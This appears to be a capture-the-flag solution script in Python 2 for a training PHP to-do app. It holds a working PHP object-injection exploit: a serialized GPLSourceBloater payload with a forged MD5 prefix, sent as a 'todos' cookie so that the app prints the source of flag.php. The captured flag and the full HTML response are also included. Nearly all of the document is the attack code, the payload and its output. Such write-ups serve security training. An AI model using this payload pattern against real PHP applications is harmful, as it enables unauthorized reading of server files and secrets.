import requests
import urllib

HOST = 'http://free.training.jinblack.it'

#using python2 in order to url escape the cookies


#flag{This_flAg_1s_really_fr33_a5_in_PhP}


#we know that flag is in flag.php
#goal: to overwrite the variabile $s->source = __FILE__ with flag.php
#this because echo $s calls the toString() (in the same way of the print in Java)


#php code to insert in the php shell:

# Class GPLSourceBloater{
#     public function __toString()
#     {
#         return highlight_file('license.txt', true).highlight_file($this->source, true);
#     }
# }

# $o = new GPLSourceBloater();
# $o->source = 'flag.php';

# $todos[] = $o;

# $m = serialize($todos);
# $h = md5($m);

# echo $h.$m;
# it prints 760463360e4919ca238d1566fc26661fa:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}

# I take the result that will be the cookies, but they need to be url escaped.
# In this way, I can print them with the page flag.php through the echo of the object.
# This because the echo prints the toString() method


cookie = urllib.quote('760463360e4919ca238d1566fc26661fa:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}')
#print(cookies)

c = dict(todos=cookie)
r = requests.get(HOST, cookies=c)


print(r.text)


#result:

# <html>
# <head>
#     <style>
#     * {font-family: "Comic Sans MS", cursive, sans-serif}
#     </style>
# </head>

# <h1>My open/libre/free/PHP/Linux/systemd/GNU TODO List</h1>
# <a href="?source"><h2>It's super secure, see for yourself</h2></a>
# <ul>
#     <li><code><span style="color: #000000">
# I'd&nbsp;just&nbsp;like&nbsp;to&nbsp;interject&nbsp;for&nbsp;a&nbsp;moment.&nbsp;What&nbsp;you're&nbsp;referring&nbsp;to&nbsp;as&nbsp;Linux,&nbsp;is&nbsp;in&nbsp;fact,&nbsp;GNU/Linux,&nbsp;or&nbsp;as&nbsp;I've&nbsp;recently&nbsp;taken&nbsp;to&nbsp;calling&nbsp;it,&nbsp;GNU&nbsp;plus&nbsp;Linux.&nbsp;<br />Linux&nbsp;is&nbsp;not&nbsp;an&nbsp;operating&nbsp;system&nbsp;unto&nbsp;itself,&nbsp;but&nbsp;rather&nbsp;another&nbsp;free&nbsp;component&nbsp;of&nbsp;a&nbsp;fully&nbsp;functioning&nbsp;GNU&nbsp;system&nbsp;made&nbsp;useful&nbsp;by&nbsp;the&nbsp;GNU&nbsp;corelibs,&nbsp;<br />shell&nbsp;utilities&nbsp;and&nbsp;vital&nbsp;system&nbsp;components&nbsp;comprising&nbsp;a&nbsp;full&nbsp;OS&nbsp;as&nbsp;defined&nbsp;by&nbsp;POSIX.<br /><br />Many&nbsp;computer&nbsp;users&nbsp;run&nbsp;a&nbsp;modified&nbsp;version&nbsp;of&nbsp;the&nbsp;GNU&nbsp;system&nbsp;every&nbsp;day,&nbsp;without&nbsp;realizing&nbsp;it.&nbsp;<br />Through&nbsp;a&nbsp;peculiar&nbsp;turn&nbsp;of&nbsp;events,&nbsp;the&nbsp;version&nbsp;of&nbsp;GNU&nbsp;which&nbsp;is&nbsp;widely&nbsp;used&nbsp;today&nbsp;is&nbsp;often&nbsp;called&nbsp;"Linux",&nbsp;<br />and&nbsp;many&nbsp;of&nbsp;its&nbsp;users&nbsp;are&nbsp;not&nbsp;aware&nbsp;that&nbsp;it&nbsp;is&nbsp;basically&nbsp;the&nbsp;GNU&nbsp;system,&nbsp;developed&nbsp;by&nbsp;the&nbsp;GNU&nbsp;Project.<br /><br />There&nbsp;really&nbsp;is&nbsp;a&nbsp;Linux,&nbsp;and&nbsp;these&nbsp;people&nbsp;are&nbsp;using&nbsp;it,&nbsp;but&nbsp;it&nbsp;is&nbsp;just&nbsp;a&nbsp;part&nbsp;of&nbsp;the&nbsp;system&nbsp;they&nbsp;use.&nbsp;Linux&nbsp;is&nbsp;the&nbsp;kernel:&nbsp;<br />the&nbsp;program&nbsp;in&nbsp;the&nbsp;system&nbsp;that&nbsp;allocates&nbsp;the&nbsp;machine's&nbsp;resources&nbsp;to&nbsp;the&nbsp;other&nbsp;programs&nbsp;that&nbsp;you&nbsp;run.&nbsp;<br />The&nbsp;kernel&nbsp;is&nbsp;an&nbsp;essential&nbsp;part&nbsp;of&nbsp;an&nbsp;operating&nbsp;system,&nbsp;but&nbsp;useless&nbsp;by&nbsp;itself;&nbsp;it&nbsp;can&nbsp;only&nbsp;function&nbsp;in&nbsp;the&nbsp;context&nbsp;of&nbsp;a&nbsp;complete&nbsp;operating&nbsp;system.&nbsp;<br />Linux&nbsp;is&nbsp;normally&nbsp;used&nbsp;in&nbsp;combination&nbsp;with&nbsp;the&nbsp;GNU&nbsp;operating&nbsp;system:&nbsp;the&nbsp;whole&nbsp;system&nbsp;is&nbsp;basically&nbsp;GNU&nbsp;with&nbsp;Linux&nbsp;added,&nbsp;or&nbsp;GNU/Linux.&nbsp;<br />All&nbsp;the&nbsp;so-called&nbsp;"Linux"&nbsp;distributions&nbsp;are&nbsp;really&nbsp;distributions&nbsp;of&nbsp;GNU/Linux.<br /></span>
# </code><code><span style="color: #000000">
# <span style="color: #0000BB">&lt;?php&nbsp;</span><span style="color: #DD0000">"flag{This_flAg_1s_really_fr33_a5_in_PhP}"</span><span style="color: #007700">;<br />echo(</span><span style="color: #DD0000">"Nice&nbsp;try&nbsp;lol"</span><span style="color: #007700">);<br /></span>
# </span>
# </code></li>
# </ul>

# <form method="post" href=".">
#     <textarea name="text"></textarea>
#     <input type="submit" value="store">
# </form>